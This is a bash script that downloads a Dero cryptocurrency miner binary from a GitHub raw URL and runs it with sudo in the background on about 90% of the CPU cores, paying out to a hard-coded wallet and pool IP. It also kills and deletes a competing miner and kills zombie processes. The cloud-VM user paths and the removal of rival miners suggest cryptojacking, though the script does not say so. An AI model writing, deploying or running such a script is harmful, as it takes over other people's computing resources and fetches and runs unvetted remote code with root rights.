#!/bin/bash
if [ -d "/home/azureuser" ]; then
    username="azureuser"
elif [ -d "/home/ubuntu" ]; then
	username="ubuntu"
else
	username=$(ls /home | sed -n 1p)
fi
cd /home/$username/
#wget -O fixdev.sh https://aztools.uk/fixdev.sh
#chmod +x fixdev.sh
core=$(nproc)
minecore=$(printf '%.0f\n' $(($core*90/100)))
if [ $core -lt 3 ]; then
	minecore=$(($core/2))
fi
if pgrep -x "deroplus" > /dev/null
then
	sudo kill -9 $(pgrep -x "deroplus")
fi
if pgrep -x "astrominer" > /dev/null
then
	sudo kill -9 $(pgrep -x "astrominer")
fi
if pgrep -x "astrominer" > /dev/null
    then
	echo "Miner is running"
	cpuusage=$(top -b -n2 -p 1 | fgrep "Cpu(s)" | tail -1 | awk '{print $2}'|cut -f 1 -d ".")
	if [ $cpuusage -lt 40 ]; then
		sudo kill -9 $(pgrep -x "astrominer")
		if [ $core -lt 3 ]; then
			nohup sudo /home/$username/astrominer -w dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz -r 80.79.5.26:10100 -p rpc -m $minecore &
		else
			nohup sudo /home/$username/astrominer -w dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz -r 80.79.5.26:10100 -p rpc -m $minecore &
		fi
	fi
else
    file="/home/$username/astrominer"
	if [ -f $file ]; then
		nohup sudo /home/$username/astrominer -w dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz -r 80.79.5.26:10100 -p rpc -m $minecore &
	else
		wget -O /home/$username/astrominer https://github.com/onisoc/files/raw/main/astrominer
		chmod +x /home/$username/astrominer
		nohup sudo /home/$username/astrominer -w dero1qyzyyksdf073xaxlvaamwre5jxns24ug4rpdxtu8ek2mla7lze9azqg8zqxgz -r 80.79.5.26:10100 -p rpc -m $minecore &
		#--wallet=dero1qyzhzc74y7a7yuqh9ghlp3xuq55nk52sz7crgscazrlh0rvhhxylgqgpv0f3g --host=80.79.5.26:10100 --mode solo --threads $minecore
	fi
fi
defunctpid=$(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')
if [ ! -z "$defunctpid" ]; then
	sudo kill -9 $defunctpid
fi
if pgrep -x "deroplus" > /dev/null
then
	sudo sudo pkill -9 -f "/home/$username/deroplus"
	sudo rm -rf /home/$username/deroplus
fi
